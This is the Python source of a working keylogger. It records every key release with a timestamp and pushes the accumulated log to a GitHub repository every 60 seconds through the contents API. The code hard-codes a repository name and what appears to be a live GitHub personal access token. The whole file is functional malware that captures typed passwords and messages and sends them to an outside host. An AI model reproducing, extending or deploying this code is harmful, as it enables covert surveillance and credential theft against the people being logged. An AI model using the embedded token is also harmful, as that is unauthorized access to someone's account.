import keyboard
import os
import sys
import subprocess
import base64
from datetime import datetime
from threading import Timer
import requests

class Keylogger:
    def __init__(self, interval=60):
        self.interval = interval
        self.log = ""
        self.github_repo = "STORAGERKIR/keys"
        self.github_token = "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"
        self.file_path = "keys.txt"
        self.check_dependencies()
        
    def check_dependencies(self):
        required = ['keyboard', 'requests']
        missing = []
        for package in required:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
        
        if missing:
            print(f"Missing packages: {', '.join(missing)}")
            choice = input("Would you like to install them now? (y/n): ").lower()
            if choice == 'y':
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
                    print("Packages installed successfully!")
                except Exception as e:
                    print(f"Error installing packages: {e}")
                    sys.exit(1)
            else:
                print("Exiting...")
                sys.exit(1)

    def callback(self, event):
        name = event.name
        timestamp = datetime.now().strftime("%H:%M")
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        self.log += f"{name} --- {timestamp}\n"

    def update_github(self):
        if not self.github_repo or not self.github_token:
            return
            
        try:
            url = f"https://api.github.com/repos/{self.github_repo}/contents/{self.file_path}"
            headers = {
                "Authorization": f"token {self.github_token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # Get current file SHA if exists
            response = requests.get(url, headers=headers)
            sha = None
            current_content = ""
            
            if response.status_code == 200:
                sha = response.json().get('sha')
                current_content = base64.b64decode(response.json()['content']).decode('utf-8')
            
            # Combine old content with new logs
            updated_content = current_content + self.log
            
            # Encode new content
            content_bytes = updated_content.encode('utf-8')
            content_encoded = base64.b64encode(content_bytes).decode('utf-8')
            
            data = {
                "message": "Update keylog",
                "content": content_encoded,
                "sha": sha
            }
            
            response = requests.put(url, headers=headers, json=data)
            if response.status_code in [200, 201]:
                print("Successfully updated GitHub repository")
            else:
                print(f"Failed to update GitHub: {response.text}")
        except Exception as e:
            print(f"GitHub error: {e}")

    def report(self):
        if self.log:
            print("Updating logs...")
            
            
            
            # Update GitHub
            self.update_github()
            
            self.log = ""
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        print(f"Keylogger started at {datetime.now()}")
        print("Press ESC to stop...")
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait('esc')

if __name__ == "__main__":
    keylogger = Keylogger(interval=60)  # Updates every 60 seconds
    keylogger.start()
